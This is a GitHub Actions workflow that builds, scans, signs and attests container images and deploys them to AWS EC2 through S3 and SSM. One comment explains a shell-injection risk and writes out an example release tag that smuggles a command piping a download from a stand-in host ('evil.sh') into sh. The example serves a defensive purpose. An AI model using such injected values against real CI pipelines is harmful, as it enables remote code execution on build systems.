name: Deploy AWS App (EC2 Compose)

on:
  release:
    types: [published]
  workflow_dispatch:
    inputs:
      release_tag:
        description: 'Release tag to deploy (example: v0.1.0)'
        required: true
        type: string

permissions:
  id-token: write
  contents: read

concurrency:
  group: deploy-aws-prod
  cancel-in-progress: false

jobs:
  build-and-push:
    name: Build + Push + Bundle
    runs-on: ubuntu-latest
    environment: production

    outputs:
      release_tag: ${{ steps.meta.outputs.release_tag }}
      image_tag: ${{ steps.meta.outputs.image_tag }}
      api_image: ${{ steps.images.outputs.api_image }}
      web_image: ${{ steps.images.outputs.web_image }}

    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6
        with:
          fetch-depth: 0
          ref: ${{ github.event_name == 'release' && github.ref || inputs.release_tag }}

      - name: Resolve release tag
        id: meta
        # Passed as environment variables, never interpolated into the
        # script. `${{ }}` is substituted into the script *text* before
        # bash runs, so a tag named `v1"; curl evil.sh | sh; x="` executes
        # — and the `tr` sanitisation below would run far too late to
        # help. As an env var the value is data, whatever it contains.
        env:
          EVENT_NAME: ${{ github.event_name }}
          RELEASE_TAG: ${{ github.event.release.tag_name }}
          INPUT_TAG: ${{ inputs.release_tag }}
        run: |
          if [ "$EVENT_NAME" = "release" ]; then
            raw_tag="$RELEASE_TAG"
          else
            raw_tag="$INPUT_TAG"
          fi

          if [ -z "$raw_tag" ]; then
            echo "Release tag is empty" >&2
            exit 1
          fi

          safe_tag="$(printf '%s' "$raw_tag" | tr '/:@ ' '-' | tr -cd '[:alnum:]._-')"

          if [ -z "$safe_tag" ]; then
            echo "Release tag '$raw_tag' became empty after sanitization" >&2
            exit 1
          fi

          echo "release_tag=$raw_tag" >> "$GITHUB_OUTPUT"
          echo "image_tag=$safe_tag" >> "$GITHUB_OUTPUT"

      - name: Validate required deploy variables
        env:
          AWS_REGION: ${{ vars.AWS_REGION }}
          AWS_ECR_API_REPOSITORY_URI: ${{ vars.AWS_ECR_API_REPOSITORY_URI }}
          AWS_ECR_WEB_REPOSITORY_URI: ${{ vars.AWS_ECR_WEB_REPOSITORY_URI }}
          AWS_DEPLOY_BUCKET: ${{ vars.AWS_DEPLOY_BUCKET }}
          AWS_DEPLOY_INSTANCE_ID: ${{ vars.AWS_DEPLOY_INSTANCE_ID }}
          AWS_SSM_APP_PREFIX: ${{ vars.AWS_SSM_APP_PREFIX }}
        run: |
          required=(
            AWS_REGION
            AWS_ECR_API_REPOSITORY_URI
            AWS_ECR_WEB_REPOSITORY_URI
            AWS_DEPLOY_BUCKET
            AWS_DEPLOY_INSTANCE_ID
            AWS_SSM_APP_PREFIX
          )

          for name in "${required[@]}"; do
            if printenv "$name" >/dev/null; then
              value="$(printenv "$name")"
            else
              value=""
            fi
            if [ -z "$value" ]; then
              echo "Missing GitHub environment variable: $name" >&2
              exit 1
            fi
          done

      - name: Load web build variables from docker/.env.app.prod
        run: |
          set -euo pipefail

          APP_ENV_FILE="docker/.env.app.prod"
          if [ ! -f "$APP_ENV_FILE" ]; then
            echo "Missing app env template in repository: $APP_ENV_FILE" >&2
            exit 1
          fi

          NEXT_PUBLIC_API_BASE_URL="$(grep -E '^NEXT_PUBLIC_API_BASE_URL=' "$APP_ENV_FILE" | tail -n1 | cut -d'=' -f2- || true)"
          if [ -z "$NEXT_PUBLIC_API_BASE_URL" ]; then
            echo "Missing required key in $APP_ENV_FILE: NEXT_PUBLIC_API_BASE_URL" >&2
            exit 1
          fi

          echo "NEXT_PUBLIC_API_BASE_URL=$NEXT_PUBLIC_API_BASE_URL" >> "$GITHUB_ENV"

      - uses: aws-actions/configure-aws-credentials@cbe3b392738ccf3f987d68400dafcf4b0624a56c # v6
        with:
          aws-region: ${{ vars.AWS_REGION }}
          role-to-assume: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}

      - uses: aws-actions/amazon-ecr-login@03f1aad4c6c7ffd436567f42f9384779290529bd # v2

      - name: Build + push API and web images
        id: images
        env:
          API_REPOSITORY: ${{ vars.AWS_ECR_API_REPOSITORY_URI }}
          WEB_REPOSITORY: ${{ vars.AWS_ECR_WEB_REPOSITORY_URI }}
          IMAGE_TAG: ${{ steps.meta.outputs.image_tag }}
          NEXT_PUBLIC_API_BASE_URL: ${{ env.NEXT_PUBLIC_API_BASE_URL }}
        run: |
          api_image="${API_REPOSITORY}:${IMAGE_TAG}"
          web_image="${WEB_REPOSITORY}:${IMAGE_TAG}"
          api_repo_name="${API_REPOSITORY#*/}"
          web_repo_name="${WEB_REPOSITORY#*/}"
          effective_api_url="${NEXT_PUBLIC_API_URL:-${NEXT_PUBLIC_API_BASE_URL:-}}"

          if [ -z "$effective_api_url" ]; then
            echo "Missing NEXT_PUBLIC_API_URL/NEXT_PUBLIC_API_BASE_URL for web image build" >&2
            exit 1
          fi

          if aws ecr describe-images --repository-name "$api_repo_name" --image-ids imageTag="$IMAGE_TAG" >/dev/null 2>&1; then
            echo "API image already exists in ECR with immutable tag, reusing: $api_image"
          else
            docker build -f apps/api/Dockerfile --target prod -t "$api_image" .
            docker push "$api_image"
          fi

          if aws ecr describe-images --repository-name "$web_repo_name" --image-ids imageTag="$IMAGE_TAG" >/dev/null 2>&1; then
            echo "Web image already exists in ECR with immutable tag, reusing: $web_image"
          else
            docker build \
              --build-arg NEXT_PUBLIC_API_BASE_URL="$NEXT_PUBLIC_API_BASE_URL" \
              --build-arg NEXT_PUBLIC_RELEASE="$IMAGE_TAG" \
              -f apps/ui/Dockerfile --target prod -t "$web_image" .
            docker push "$web_image"
          fi

          echo "api_image=$api_image" >> "$GITHUB_OUTPUT"
          echo "web_image=$web_image" >> "$GITHUB_OUTPUT"

      # --- Pin to the digest actually in the registry --------------------------
      #
      # Everything below refers to images by digest rather than tag, and the
      # digest is read back from ECR rather than from the local daemon.
      #
      # The local daemon is not a reliable source here. The build step above
      # skips the build entirely when the tag already exists in ECR, so on a
      # re-run there is no local image to inspect at all — and a `docker
      # inspect` lookup that fails leaves you signing and scanning a mutable
      # tag, which is the exact substitution the signing comment below warns
      # about. Reading from ECR gives the same answer on both paths.
      - name: Resolve pushed image digests
        id: digests
        env:
          API_REPOSITORY: ${{ vars.AWS_ECR_API_REPOSITORY_URI }}
          WEB_REPOSITORY: ${{ vars.AWS_ECR_WEB_REPOSITORY_URI }}
          IMAGE_TAG: ${{ steps.meta.outputs.image_tag }}
        run: |
          set -euo pipefail

          resolve() {
            repo_uri="$1"
            repo_name="${repo_uri#*/}"
            digest="$(aws ecr describe-images \
              --repository-name "$repo_name" \
              --image-ids imageTag="$IMAGE_TAG" \
              --query 'imageDetails[0].imageDigest' \
              --output text 2>/dev/null || true)"

            if [ -z "$digest" ] || [ "$digest" = "None" ]; then
              echo "Could not resolve digest for ${repo_uri}:${IMAGE_TAG}" >&2
              exit 1
            fi
            printf '%s@%s' "$repo_uri" "$digest"
          }

          api_ref="$(resolve "$API_REPOSITORY")"
          web_ref="$(resolve "$WEB_REPOSITORY")"

          echo "api_ref=$api_ref" >> "$GITHUB_OUTPUT"
          echo "web_ref=$web_ref" >> "$GITHUB_OUTPUT"
          echo "Resolved API: $api_ref"
          echo "Resolved web: $web_ref"

      # --- Scan what is about to ship -----------------------------------------
      #
      # CI already runs Trivy and an SBOM, but on an image it builds itself and
      # then throws away — a different build from a different tree at a
      # different time. Two builds of one commit are not the same artifact:
      # `node:24-alpine` is a moving tag that upstream rebuilds for security
      # patches, and that base layer is most of what Trivy has an opinion
      # about. So CI's scan is early warning, and this is the gate.
      #
      # It runs before signing deliberately. A signature over an unscanned
      # image is an attestation that it was built here, not that it is fit to
      # run — and once signed it looks trustworthy to everything downstream.
      - name: Trivy scan (API image)
        uses: aquasecurity/trivy-action@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # v0.35.0
        with:
          image-ref: ${{ steps.digests.outputs.api_ref }}
          format: table
          exit-code: '1'
          ignore-unfixed: true
          trivyignores: .trivyignore
          vuln-type: os,library
          severity: HIGH,CRITICAL

      - name: Trivy scan (web image)
        uses: aquasecurity/trivy-action@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # v0.35.0
        with:
          image-ref: ${{ steps.digests.outputs.web_ref }}
          format: table
          exit-code: '1'
          ignore-unfixed: true
          trivyignores: .trivyignore
          vuln-type: os,library
          severity: HIGH,CRITICAL

      - name: Prepare artifacts dir
        run: mkdir -p artifacts

      - name: Generate SBOM (API image)
        uses: anchore/sbom-action@aa80c8c5bd439a416a62804f2151ab38c671a638 # v0
        with:
          image: ${{ steps.digests.outputs.api_ref }}
          format: spdx-json
          output-file: artifacts/sbom-api.spdx.json
          upload-artifact: false
          upload-release-assets: false

      - name: Generate SBOM (web image)
        uses: anchore/sbom-action@aa80c8c5bd439a416a62804f2151ab38c671a638 # v0
        with:
          image: ${{ steps.digests.outputs.web_ref }}
          format: spdx-json
          output-file: artifacts/sbom-web.spdx.json
          upload-artifact: false
          upload-release-assets: false

      # sbom-action reports success even when it writes an unusable file, and
      # an empty SBOM attached to a signed image is worse than none — it looks
      # like a component inventory and is not one.
      - name: Validate SBOM files
        run: |
          set -euo pipefail
          test -s artifacts/sbom-api.spdx.json
          test -s artifacts/sbom-web.spdx.json
          jq -e '.spdxVersion and (.packages | type == "array")' artifacts/sbom-api.spdx.json > /dev/null
          jq -e '.spdxVersion and (.packages | type == "array")' artifacts/sbom-web.spdx.json > /dev/null

      # --- Supply-chain attestation -------------------------------------------
      #
      # Signing and provenance answer two different questions. The signature
      # says "this image came from this repository's workflow"; the provenance
      # says "and here is the commit, the workflow file and the inputs that
      # produced it". Together they are what lets you refuse an image that was
      # pushed by hand, or built from a branch nobody reviewed.
      #
      # Keyless signing: cosign gets a short-lived certificate from Fulcio,
      # bound to this workflow's OIDC identity, and records it in the Rekor
      # transparency log. There is no private key to store, rotate or leak —
      # which is the whole reason to prefer it over a long-lived key in a
      # secret.
      - name: Install cosign
        uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2

      - name: Sign images (keyless)
        env:
          # Digests resolved from ECR above. Sign by digest, never by tag: a
          # tag can be repointed at a different image after signing, and the
          # signature would still verify against the tag.
          IMAGES: ${{ steps.digests.outputs.api_ref }} ${{ steps.digests.outputs.web_ref }}
        run: |
          set -euo pipefail
          for image in $IMAGES; do
            [ -n "$image" ] || continue
            cosign sign --yes "$image"
            echo "signed: $image"
          done

      - name: Attach SLSA provenance
        env:
          IMAGES: ${{ steps.digests.outputs.api_ref }} ${{ steps.digests.outputs.web_ref }}
          BUILD_REPO: ${{ github.repository }}
          BUILD_SHA: ${{ github.sha }}
          BUILD_REF: ${{ github.ref }}
          BUILD_RUN: ${{ github.run_id }}
        run: |
          set -euo pipefail
          cat > /tmp/provenance.json <<JSON
          {
            "buildType": "https://github.com/actions/runner",
            "builder": { "id": "https://github.com/${BUILD_REPO}/actions/runs/${BUILD_RUN}" },
            "invocation": {
              "configSource": {
                "uri": "git+https://github.com/${BUILD_REPO}@${BUILD_REF}",
                "digest": { "sha1": "${BUILD_SHA}" },
                "entryPoint": ".github/workflows/deploy.yml"
              }
            }
          }
          JSON
          for image in $IMAGES; do
            [ -n "$image" ] || continue
            cosign attest --yes --predicate /tmp/provenance.json --type slsaprovenance "$image"
            echo "attested: $image"
          done

      # The SBOM travels with the image rather than sitting in a CI artifact
      # nobody fetches. Attached after signing so that anything consuming it
      # can verify the signature first, and keyed to the same digest — an SBOM
      # attached to a tag would describe whatever that tag pointed at when it
      # was written, not what is running.
      - name: Attach SBOM attestations
        env:
          API_REF: ${{ steps.digests.outputs.api_ref }}
          WEB_REF: ${{ steps.digests.outputs.web_ref }}
        run: |
          set -euo pipefail
          cosign attest --yes --predicate artifacts/sbom-api.spdx.json --type spdxjson "$API_REF"
          echo "sbom attested: $API_REF"
          cosign attest --yes --predicate artifacts/sbom-web.spdx.json --type spdxjson "$WEB_REF"
          echo "sbom attested: $WEB_REF"

      - name: Package tracked files into deploy bundle
        env:
          IMAGE_TAG: ${{ steps.meta.outputs.image_tag }}
        run: |
          mkdir -p artifacts
          git archive --format=tar.gz --output "artifacts/deploy-bundle-${IMAGE_TAG}.tar.gz" HEAD

      - name: Upload deploy bundle to S3
        env:
          IMAGE_TAG: ${{ steps.meta.outputs.image_tag }}
          DEPLOY_BUCKET: ${{ vars.AWS_DEPLOY_BUCKET }}
        run: |
          aws s3 cp \
            "artifacts/deploy-bundle-${IMAGE_TAG}.tar.gz" \
            "s3://${DEPLOY_BUCKET}/releases/gpool/${IMAGE_TAG}/deploy-bundle.tar.gz"

  deploy-app:
    name: Remote App Deploy via SSM
    runs-on: ubuntu-latest
    environment: production
    needs: build-and-push

    steps:
      - uses: aws-actions/configure-aws-credentials@cbe3b392738ccf3f987d68400dafcf4b0624a56c # v6
        with:
          aws-region: ${{ vars.AWS_REGION }}
          role-to-assume: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}

      - name: Execute remote app deploy command
        env:
          AWS_REGION: ${{ vars.AWS_REGION }}
          INSTANCE_ID: ${{ vars.AWS_DEPLOY_INSTANCE_ID }}
          DEPLOY_BUCKET: ${{ vars.AWS_DEPLOY_BUCKET }}
          APP_SSM_PREFIX: ${{ vars.AWS_SSM_APP_PREFIX }}
          RELEASE_TAG: ${{ needs.build-and-push.outputs.image_tag }}
          API_IMAGE: ${{ needs.build-and-push.outputs.api_image }}
          WEB_IMAGE: ${{ needs.build-and-push.outputs.web_image }}
        run: |
          payload_file="$(mktemp)"

          jq -n \
            --arg instance "$INSTANCE_ID" \
            --arg region "$AWS_REGION" \
            --arg bucket "$DEPLOY_BUCKET" \
            --arg release "$RELEASE_TAG" \
            --arg api_image "$API_IMAGE" \
            --arg web_image "$WEB_IMAGE" \
            --arg app_prefix "$APP_SSM_PREFIX" \
            '{
              DocumentName: "AWS-RunShellScript",
              InstanceIds: [$instance],
              Parameters: {
                commands: [
                  "set -euo pipefail",
                  "BASE_DIR=\"/opt/gpool\"",
                  "RELEASE_DIR=\"$BASE_DIR/releases/\($release)\"",
                  "mkdir -p \"$BASE_DIR/releases\"",
                  "rm -rf \"$RELEASE_DIR\"",
                  "mkdir -p \"$RELEASE_DIR\"",
                  "aws s3 cp \"s3://\($bucket)/releases/gpool/\($release)/deploy-bundle.tar.gz\" \"/tmp/gpool-\($release).tar.gz\" --region \($region)",
                  "tar -xzf \"/tmp/gpool-\($release).tar.gz\" -C \"$RELEASE_DIR\"",
                  "cd \"$RELEASE_DIR\"",
                  "chmod +x scripts/prod-deploy-remote.sh",
                  "./scripts/prod-deploy-remote.sh --release-dir \"$RELEASE_DIR\" --region \"\($region)\" --app-ssm-prefix \"\($app_prefix)\" --api-image \"\($api_image)\" --web-image \"\($web_image)\" --release-tag \"\($release)\""
                ]
              }
            }' > "$payload_file"

          command_id="$(aws ssm send-command --cli-input-json "file://${payload_file}" --query 'Command.CommandId' --output text)"

          echo "SSM command id: $command_id"

          max_attempts=180
          sleep_seconds=10
          status=""
          status_details=""
          invocation_available="false"

          for attempt in $(seq 1 "$max_attempts"); do
            set +e
            invocation_json="$(aws ssm get-command-invocation --command-id "$command_id" --instance-id "$INSTANCE_ID" --output json 2>&1)"
            rc=$?
            set -e

            if [ "$rc" -ne 0 ]; then
              echo "poll[$attempt/$max_attempts]: invocation not ready yet"
            else
              invocation_available="true"
              status="$(printf '%s' "$invocation_json" | jq -r '.Status')"
              status_details="$(printf '%s' "$invocation_json" | jq -r '.StatusDetails')"
              echo "poll[$attempt/$max_attempts]: status=$status details=$status_details"

              case "$status" in
                Success|Cancelled|TimedOut|Failed|Cancelling)
                  break
                  ;;
              esac
            fi

            if [ "$attempt" -lt "$max_attempts" ]; then
              sleep "$sleep_seconds"
            fi
          done

          if [ "$invocation_available" != "true" ]; then
            echo "Unable to read SSM command invocation details (command_id=$command_id)" >&2
            exit 1
          fi

          echo "Command status: $status"
          aws ssm get-command-invocation --command-id "$command_id" --instance-id "$INSTANCE_ID" --query '{Status:Status,StatusDetails:StatusDetails,ResponseCode:ResponseCode,ExecutionStartDateTime:ExecutionStartDateTime,ExecutionEndDateTime:ExecutionEndDateTime,StandardOutputUrl:StandardOutputUrl,StandardErrorUrl:StandardErrorUrl}' --output json || true
          aws ssm get-command-invocation --command-id "$command_id" --instance-id "$INSTANCE_ID" --query 'StandardOutputContent' --output text || true
          aws ssm get-command-invocation --command-id "$command_id" --instance-id "$INSTANCE_ID" --query 'StandardErrorContent' --output text || true

          if [ "$status" != "Success" ]; then
            echo "Remote app deployment failed (status=$status, status_details=$status_details)" >&2
            exit 1
          fi

  post-deploy-smoke:
    name: Post Deploy Smoke
    runs-on: ubuntu-latest
    environment: production
    needs: deploy-app

    steps:
      - name: Smoke health check
        if: ${{ vars.DEPLOY_HEALTHCHECK_URL != '' }}
        run: |
          curl -fsS "${{ vars.DEPLOY_HEALTHCHECK_URL }}" > /dev/null
          echo "Health check passed: ${{ vars.DEPLOY_HEALTHCHECK_URL }}"
